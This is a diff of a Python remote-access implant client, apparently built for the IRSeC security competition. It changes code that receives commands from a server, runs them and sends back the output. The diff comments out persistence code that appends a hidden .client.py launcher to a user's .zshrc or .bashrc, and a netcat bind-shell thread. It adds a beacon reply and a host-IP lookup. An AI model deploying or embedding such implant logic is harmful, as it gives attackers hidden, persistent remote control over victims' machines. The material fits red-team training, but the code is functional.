@@ -84,43 +84,43 @@ elif len(sys.argv) == 3: #custom IP and port
         print("Can not cast port to int! Defaulting to 8080.")
     
 
-#For persistence, see if the user uses zsh or bash. If they use neither, then don't do any persistence.
-try:
-    #If they use zshrc, set that to the rcFile to edit
-    if os.path.exists(f"{os.path.expanduser('~')}/.zshrc"):
-        rcFile = ".zshrc"
-        NO_PERSISTENCE = False
-    #if they don't use zshrc, see if they use bashrc
-    elif os.path.exists(f"{os.path.expanduser('~')}/.bashrc"):
-        rcFile = ".bashrc"
-        NO_PERSISTENCE = False
-    else:
-        NO_PERSISTENCE = True
+# #For persistence, see if the user uses zsh or bash. If they use neither, then don't do any persistence.
+# try:
+#     #If they use zshrc, set that to the rcFile to edit
+#     if os.path.exists(f"{os.path.expanduser('~')}/.zshrc"):
+#         rcFile = ".zshrc"
+#         NO_PERSISTENCE = False
+#     #if they don't use zshrc, see if they use bashrc
+#     elif os.path.exists(f"{os.path.expanduser('~')}/.bashrc"):
+#         rcFile = ".bashrc"
+#         NO_PERSISTENCE = False
+#     else:
+#         NO_PERSISTENCE = True
 
-    #Open their rc file and check if our persistence is already there. If it is, skip this step. If it isn't, make it persistent.
-    with open(f"{os.path.expanduser('~')}/{rcFile}","r",) as file:
-        if f"python3 {os.path.expanduser('~')}/.client.py {SERVER_HOST} {SERVER_PORT} &\n" not in file:
-            MAKE_PERSISTENT = True
-        else:
-            MAKE_PERSISTENT = False
+#     #Open their rc file and check if our persistence is already there. If it is, skip this step. If it isn't, make it persistent.
+#     with open(f"{os.path.expanduser('~')}/{rcFile}","r",) as file:
+#         if f"python3 {os.path.expanduser('~')}/.client.py {SERVER_HOST} {SERVER_PORT} &\n" not in file:
+#             MAKE_PERSISTENT = True
+#         else:
+#             MAKE_PERSISTENT = False
 
-    #If we want to make it persistent and a file to edit exists, do it.
-    if MAKE_PERSISTENT and not NO_PERSISTENCE: 
-        subprocess.run(f"cp /usr/local/bin/.client.py {os.path.expanduser('~')}/.client.py",shell=True) #Copy the client to their home dir and make it .client.py
-        with open(f"{os.path.expanduser('~')}/{rcFile}","a",) as file:
-            file.write(f"python3 {os.path.expanduser('~')}/.client.py {SERVER_HOST} {SERVER_PORT} &\n")
-except:
-    pass
+#     #If we want to make it persistent and a file to edit exists, do it.
+#     if MAKE_PERSISTENT and not NO_PERSISTENCE: 
+#         subprocess.run(f"cp /usr/local/bin/.client.py {os.path.expanduser('~')}/.client.py",shell=True) #Copy the client to their home dir and make it .client.py
+#         with open(f"{os.path.expanduser('~')}/{rcFile}","a",) as file:
+#             file.write(f"python3 {os.path.expanduser('~')}/.client.py {SERVER_HOST} {SERVER_PORT} &\n")
+# except:
+#     pass
 
-NCPORT = random.randint(8000,9000) #Picks a random port between 8000-9000
-if NCPORT == SERVER_PORT:
-    NCPORT = 8081
-#Assume the client has netcat installed. If they don't, then just skip this step.
-try:
-    tty = Thread(startTTY(NCPORT)) #Start netcat shell listening on 8081
-    tty.start() #Start the thread
-except:
-    pass
+# NCPORT = random.randint(8000,9000) #Picks a random port between 8000-9000
+# if NCPORT == SERVER_PORT:
+#     NCPORT = 8081
+# #Assume the client has netcat installed. If they don't, then just skip this step.
+# try:
+#     tty = Thread(startTTY(NCPORT)) #Start netcat shell listening on 8081
+#     tty.start() #Start the thread
+# except:
+#     pass
 
 
 def clientLoop():
@@ -146,6 +146,8 @@ def clientLoop():
             splitted_command = command.split() #Split the command
             if command == "exit": #if the user wants to exit, then keep connection alive
                 continue
+            elif command == "beacon_ping":
+                s.send("beacon_pong".encode())
             elif command == "SERVER_SHUTDOWN":
                 break
             elif splitted_command[0] == "cd": #if the user wants to change directories
@@ -223,10 +225,16 @@ def clientLoop():
                 s.close()
                 break
             elif "getIP" in command:
-                regex = re.compile(r'(10\.\d{1,2}\.\d{1,3}\.\d{1,3})')
-                IP = subprocess.run("ip a | grep inet", shell=True,stdout=subprocess.PIPE)
-                IP = str(IP)
-                IP = regex.search(IP)[0]
+                OS = subprocess.run("uname -s", shell=True,capture_output=True,text=True).stdout
+                regex = re.compile(r'(10\.\d{1,2}\.\d{1,3}\.\d{1,3})|(172\.\d{1,2}\.\d{1,3}\.\d{1,3})|(127\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC, look for 127.X.X.X, 172.X.X.X, or 10.X.X.X
+                # regex2 = re.compile(r'(172\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC
+                # regex3 = re.compile(r'(127\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC - test
+                if "Darwin" in OS:
+                    out = subprocess.run("ifconfig | grep inet", shell=True,capture_output=True,text=True).stdout
+                else:
+                    out = subprocess.run("ip a | grep inet", shell=True,capture_output=True,text=True).stdout
+                out = str(out)
+                IP = regex.search(out)[0]
                 s.send(str(IP).encode())
             else: #if the user doesn't want to perform a special action, run the command and capture the output
                 #if the command runs for longer than 5 seconds, timeout
